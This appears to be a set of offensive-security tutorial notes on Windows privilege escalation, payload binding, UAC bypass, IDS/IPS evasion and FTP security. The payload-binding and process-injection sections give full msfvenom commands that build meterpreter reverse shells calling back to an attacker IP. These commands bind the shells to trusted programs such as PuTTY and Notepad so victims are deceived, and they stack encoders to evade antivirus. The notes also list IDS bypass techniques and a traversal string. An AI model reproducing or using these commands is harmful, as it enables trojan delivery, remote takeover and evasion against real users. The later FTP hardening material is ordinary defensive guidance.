Privilege Escalation Architecture

Understanding System Privilege Models

What is Privilege Escalation?

Privilege escalation refers to the techniques by which an attacker gains higher-level access than initially granted. After successful exploitation and initial shell access, attackers typically operate with limited permissions. The goal is to elevate these permissions to gain greater system control.

Initial Shell State

When an attacker first gains access to a system, they typically receive limited permissions:

  • Current User Context: Guest or standard user account
  • Available Privileges: Restricted subset of system commands
  • Access Limitations: Cannot modify system files, registry, or run admin-level commands
  • Command Scope: Limited to user-writable directories and resources

Privilege Analysis Commands

Enumerate Current Privileges (Windows)

whoami                  # Current user identity
whoami /priv           # List all available privileges
whoami /groups         # Display user group memberships
net user %username%    # Detailed user account info

Typical Initial Privileges (5-7 Common)

  • SeChangeNotifyPrivilege - Traverse folder privilege
  • SeIncreaseWorkingSet - Increase working set size
  • SeShutdownPrivilege - Ability to shut down computer
  • SeTimeZonePrivilege - Change system time zone
  • SeCreateSymbolicLinkPrivilege - Create symbolic links
  • SeImpersonatePrivilege - Impersonate after access token creation

Restricted Commands in Guest Context

Without escalation, attackers cannot execute:

  • hashdump - Dump SAM/SYSTEM files
  • reg query HKLM - Access system registry
  • diskpart list disk - Access raw disk
  • sc query - Query system services

Horizontal Privilege Escalation

From Guest/User to Administrative Access

Horizontal vs Vertical Escalation

  • Horizontal: Guest → User → Administrator (lateral privilege increase)
  • Result: More privileges but not complete system control
  • Scope: User-level administrative tasks available
  • Typical Outcome: 10-20 privileges instead of original 5

Despite significant privilege increase, horizontal escalation has bounds:

  • Cannot fully control system boot/shutdown
  • Limited access to security identifiers (SIDs)
  • User Account Control (UAC) may still interfere with actions

Vertical Privilege Escalation

Full System Administrator Access

Vertical Escalation Objective

Vertical privilege escalation aims to achieve complete system compromise by gaining SYSTEM or full Administrator privileges. This grants unrestricted access to all system resources, kernel-level operations, and complete control over the machine.

⚠️ Vertical Escalation Challenge: UAC

User Account Control (UAC) is the primary barrier to vertical escalation on modern Windows systems. UAC prevents even administrators from performing certain actions without explicit user consent via a privilege escalation prompt.

Vertical Escalation Requirements

  • Bypass UAC: Disable or circumvent User Account Control
  • Exploit Vulnerability: Target UAC bypass techniques (fodhelper.exe, eventvwr.exe, etc.)
  • Achieve SYSTEM Context: Run commands with SYSTEM-level privileges
  • Permanent Access: Establish persistence in elevated context

Payload Binding & Executable Fusion

Disguising Malicious Payloads as Legitimate Applications

Why Payload Binding?

When an attacker delivers a raw payload executable, victims often observe suspicious behavior (no application opens, file runs in background). Modern payload binding techniques merge malicious code with legitimate executables to maintain user deception throughout the duration of exploitation.

Raw Payload Detection Problem

  • No GUI Launch: File executes silently with no visible application
  • Victim Suspicion: User notices something is wrong immediately
  • Process Investigation: Victim checks Task Manager and kills unknown processes
  • Attack Window: Brief exploit window before victim discovers malware
  • Success Rate: Very low without additional obfuscation

Payload Binding Attack Scenario

Step 1: Download Legitimate Executable
▼

Objective: Obtain a commonly used legitimate application that victim will recognize and trust.

$ wget http://downloads.putty.org/putty.exe # Or use curl/wget to download from legitimate sources $ wget https://notepadplusplus.org/repository/7.x/7.9.5/npp.7.9.5.Installer.exe $ wget https://www.7-zip.org/a/7z1900.exe

Popular Legitimate Executables for Binding:

  • PuTTY (putty.exe) - SSH terminal client
  • Notepad++ (npp.exe) - Text editor
  • 7-Zip (7z.exe) - File archiver
  • VLC Media Player (vlc.exe) - Video player
  • Adobe Reader (AcroRd32.exe) - PDF viewer
Step 2: Create Payload with Binding Parameters
▼
$ msfvenom -p windows/meterpreter/reverse_tcp \ LHOST=192.168.31.27 LPORT=4444 \ -x /path/to/putty.exe \ -k \ -e x86/shikata_ga_nai -i 5 \ -f exe -o payload_putty.exe

Command Parameters:

  • -p - Payload type (reverse_tcp shell)
  • LHOST - Attacker IP for callback
  • LPORT - Attacker listening port
  • -x - Template executable to bind with
  • -k - Keep template functional (run original app)
  • -e - Encoder for AV evasion (shikata_ga_nai)
  • -i - Encoding iterations (5 passes)
  • -f - Output format (exe)
  • -o - Output filename

Key Parameter: -k Flag

The -k parameter is crucial - it tells msfvenom to keep the template application functional. This means:

  • Original putty.exe launches normally to the user
  • Payload runs silently in parallel
  • User sees expected application behavior
  • No suspicion raised during exploitation window

User Account Control (UAC) Bypass

Disabling Windows Security Prompts for Full System Access

Understanding UAC

User Account Control (UAC) is a Windows security feature that prompts users for explicit permission when applications attempt to make system-level changes. Even administrators cannot bypass this prompt without deliberately disabling UAC or exploiting a UAC bypass vulnerability.

UAC Dialog: "Do you want to allow this app to make changes to your PC?"

UAC Bypass Significance

  • Barrier to Vertical Escalation: UAC blocks even admin-level commands
  • Real-World Defense: Most organizations enable UAC by default
  • Exploitation Requirement: Attackers must disable UAC for vertical escalation
  • Detection Difficulty: UAC bypass techniques evolve rapidly

Advanced EXE Binding & Process Injection

Hiding Malicious Code in Legitimate Windows Processes

Process Injection Concept

Rather than binding payloads at creation time, process injection involves injecting malicious code directly into running legitimate processes. This technique provides superior stealth as the malware executes within the memory space of a trusted application.

Multi-Stage Binding Workflow

Stage 1: Create Base Payload (No Binding)

$ msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.31.27 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f raw -o payload_stage1.bin

Stage 2: Bind to Legitimate EXE (Template)

$ msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.31.27 LPORT=4444 \
  -x C:\\Windows\\System32\\notepad.exe \
  -k \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o notepad_payload.exe

Stage 3: Multi-Encoder for AV Evasion

$ msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.31.27 LPORT=4444 \
  -x C:\\Windows\\System32\\notepad.exe \
  -k \
  -e x86/jmp_call_additive -i 2 \
  -e x86/shikata_ga_nai -i 3 \
  -e x86/fnstenv_mov -i 2 \
  -f exe -o notepad_payload_obfuscated.exe

Template Selection Strategy

Legitimate Application Why Effective User Expectation
Notepad.exe Always present, universal trust Opens text editor window visible to user
Explorer.exe File browser, expected at launch Opens file manager window
calc.exe Calculator, harmless appearance Opens calculator interface
mspaint.exe Paint application, low privilege expectations Opens drawing application
PuTTY.exe SSH terminal, developer-oriented Opens SSH connection window

IDS/IPS Detection & Evasion

Understanding Network-Based Security Monitoring

IDS vs IPS

  • IDS (Intrusion Detection System): Monitors network traffic and logs suspicious activities
  • IPS (Intrusion Prevention System): Actively blocks detected attacks in real-time
  • SIEM (Security Information & Event Management): Centralizes logs and correlates events

What IDS/IPS Monitor

  • Network Patterns: DDoS attacks, port scanning, reconnaissance traffic
  • Protocol Anomalies: Unusual packet sizes, malformed headers, brute-force attempts
  • Intrusion Signatures: Known exploit payloads, attack frameworks
  • Behavioral Anomalies: Unusual data transfer patterns, command execution
  • Threat Intelligence Feeds: Known malicious IPs and domains

⚠️ DDoS Attack Detection by IDS/IPS

IDS/IPS systems are particularly effective at detecting volumetric attacks:

  • Sudden spike in network traffic from single source
  • High number of connections to same target port
  • Unusual packet sizes or fragmentation patterns
  • Anomalous traffic-to-response ratios

Firewall Limitations

Firewalls CANNOT detect:

  • Encrypted attack payloads (HTTPS, encrypted channels)
  • Legitimate traffic misused for attacks
  • Internal network compromises (east-west traffic)
  • Application-layer attacks (within HTTP/HTTPS)

Firewalls CAN:

  • Filter traffic based on IP addresses and ports
  • Block packets from known malicious sources
  • Enforce stateful connections
  • Limit bandwidth and connections (rate limiting)

IDS/IPS Bypass Techniques

  • Encryption: Use HTTPS/TLS to obscure payload content
  • DNS Tunneling: Tunnel data through DNS queries (IDS-blind)
  • Timing Evasion: Slow attacks over extended periods
  • Protocol Fragmentation: Split payloads across packets
  • Polymorphic Encoding: Change payload signature each transmission
  • Legitimate Channel Abuse: Use allowed protocols (HTTP, SMTP) for C&C

✓ Real-World IDS/IPS Effectiveness

Despite limitations, enterprise IDS/IPS systems remain highly effective:

  • Detection rate: 80-95% for known attack signatures
  • Behavioral analysis catches novel attacks
  • Correlation with SIEM identifies attack patterns
  • Integration with threat intelligence prevents new variants

Web Server Architecture & Types

Understanding HTTP-Based Computing

What is a Web Server?

A web server is a software program that processes HTTP requests from clients and delivers web pages and resources. It stores website files and handles the communication protocol between clients and server, enabling the delivery of dynamic and static content over the internet.

HTTP Protocol Basics

  • HTTP (Hypertext Transfer Protocol): Application-layer protocol for web communication
  • Request Methods: GET (retrieve), POST (submit), PUT (update), DELETE (remove)
  • Status Codes: 200 (OK), 404 (Not Found), 500 (Server Error)
  • Headers: Metadata sent with requests and responses
  • Body: Actual data content (HTML, JSON, binary files)

Web Server Components

  • Listener: Binds to network port (typically 80/HTTP or 443/HTTPS) and waits for connections
  • Parser: AnalyzesHTTP requests and extracts method, URL, headers, body
  • Handler: Routes request to appropriate script/module based on URI
  • Processor: Executes server-side code (PHP, Python, ASP.NET, Node.js)
  • Responder: Formats HTTP response with status, headers, and content

FTP (File Transfer Protocol) Fundamentals

Understanding File Transfer Technology & Security

What is FTP?

FTP (File Transfer Protocol) is a standard network protocol for transferring files between computers over TCP/IP networks. It enables users to upload, download, and manage files on remote servers using a client-server architecture.

FTP Characteristics

  • Protocol: TCP-based (reliable, connection-oriented)
  • Ports: Control channel (21), Data channel (20 active / random passive)
  • Authentication: Username/password credentials
  • Operations: Upload (STOR), Download (RETR), Delete (DELE), List (LIST)
  • Security: PLAIN TEXT - credentials and data unencrypted

⚠️ FTP Security Problems

  • No Encryption: Usernames, passwords, and files transmitted in clear text
  • Man-in-Middle: Attackers can intercept credentials and data
  • Passive Attack Vulnerability: Network traffic sniffing captures credentials
  • Brute Force Susceptible: Weak password protection vulnerable to dictionary attacks
  • Anonymous Access: If enabled, anyone can access files without authentication

Anonymous vs Authenticated FTP

Type Authentication Access Security Risk
Anonymous FTP Username: "anonymous" (no password validation) Anyone can connect without credentials CRITICAL - Anyone can access/modify files
User-Based FTP Valid username + strong password Only authorized users can connect Medium - Passwords sent in clear text
SFTP (SSH FTP) SSH key-based or encrypted password Encrypted channel for file transfer LOW - Encryption protects credentials and data

⚠️ FTP Vulnerabilities in Practice

Even protected FTP servers have attack vectors:

  • Weak password enforcement (no complexity requirements)
  • Default credentials not changed (admin/admin)
  • Directory traversal (../../../etc/passwd)
  • Symlink attacks (linking to sensitive files)
  • Buffer overflow vulnerabilities in older FTP servers

User-Based FTP Access Control

Each FTP user has restricted access to specific directories:

  • alice: Can only access /home/alice/ftp (home directory)
  • bob: Can only access /home/bob/ftp (home directory)
  • Admin/root: Cannot login via FTP (security best practice)
  • Chroot Jail: Each user confined to home directory (cannot traverse upward)

✓ Secure FTP Best Practices

  • Disable anonymous FTP access completely
  • Use user-based authentication with strong passwords
  • Implement chroot jails to restrict directory traversal
  • Use SFTP (SSH-based) instead of plain FTP when possible
  • Monitor FTP access logs for suspicious activities
  • Restrict FTP access by IP address when possible
  • Disable FTP commands (DELE, RMD, MKD) if not needed

Advanced Authentication & FTP Security Hardening

Implementing Multi-Layer FTP Protection

FTP Authentication Mechanisms

  • Anonymous: No authentication (security risk - avoid)
  • Basic Authentication: Username/password in plain text (AVOID)
  • Hashed Passwords: MD5/SHA hashing (better but still transmitted plaintext)
  • SFTP (SSH-FTP): Encrypted channel + SSH key authentication (RECOMMENDED)
  • TLS/SSL (FTPS): FTP over encrypted tunnel (secure alternative)

SFTP Configuration (Encrypted FTP)

$ sudo nano /etc/ssh/sshd_config

# Enable SFTP subsystem
Subsystem sftp /usr/lib/openssh/sftp-server

# Restrict SFTP user to home directory
Match User ftp_user
    X11Forwarding no
    AllowTcpForwarding no
    PermitTTY no
    ForceCommand internal-sftp
    ChrootDirectory %h/

$ sudo systemctl restart ssh

SFTP Connection (Secure Alternative)

$ sftp -P 22 alice@192.168.1.50
Connected to 192.168.1.50
sftp> ls
project_v1.zip  report.pdf
sftp> get project_v1.zip
sftp> put local_file.txt remote_file.txt
sftp> quit

# All traffic encrypted via SSH protocol - credentials secure

⚠️ FTP Attack Vectors

  • Brute Force: Automated password guessing (mitigate with rate limiting)
  • Sniffing: Tcpdump/Wireshark captures plain-text credentials
  • Man-in-Middle: Attacker intercepts FTP session
  • Directory Traversal: ../../../etc/passwd attempts

✓ FTP Security Hardening Checklist

  • ✓ Disable anonymous FTP completely
  • ✓ Enforce strong passwords (min. 12 characters, complexity)
  • ✓ Implement account lockout after 5 failed attempts
  • ✓ Use SFTP instead of plain FTP
  • ✓ Restrict FTP access to specific IP ranges
  • ✓ Run FTP service with minimal privileges (dedicated user account)
  • ✓ Enable SSH key authentication
  • ✓ Monitor access logs for suspicious patterns
  • ✓ Keep FTP server software up-to-date (security patches)
  • ✓ Disable dangerous FTP commands (DELE, RMD, MKD, SITE)
